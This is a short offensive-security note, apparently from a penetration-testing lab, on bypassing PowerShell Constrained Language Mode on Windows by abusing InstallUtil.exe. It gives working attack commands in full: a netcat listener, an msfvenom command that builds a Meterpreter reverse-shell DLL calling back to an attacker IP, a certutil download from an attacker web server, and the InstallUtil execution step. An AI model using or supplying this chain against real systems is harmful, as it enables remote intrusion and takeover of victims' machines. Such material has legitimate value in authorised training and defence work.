# Reverse Shell CLM Bypass with Meterpreter DLL
A .NET installation utility used for registering .NET assemblies can be used and reference the RunInstaller component to trigger the malicious payload that is not found in the 'main' call. 

Compile the csharp binary in Visual Studio and transfer to victim host with certutil. 


## Requirements: 
Invoke-ReflectivePEInjection.ps1 file hosted on attacker webserver (default port 80)

```bash
# setup netcat listener
┌──(kali㉿kali)-[~]
└─$ nc -nvlp 8080

# Create the meterpreter DLL (met.dll) and host it in http web directory 
┌──(kali㉿kali)-[~/httpDirectory]
└─$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.45.227 LPORT=8080 EXITFUNC=thread -f dll > met.dll

# Download file via certutil -urlcache -f http://ip/CLMBypass-dll.exe dll.exe
PS > C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U dll.exe
```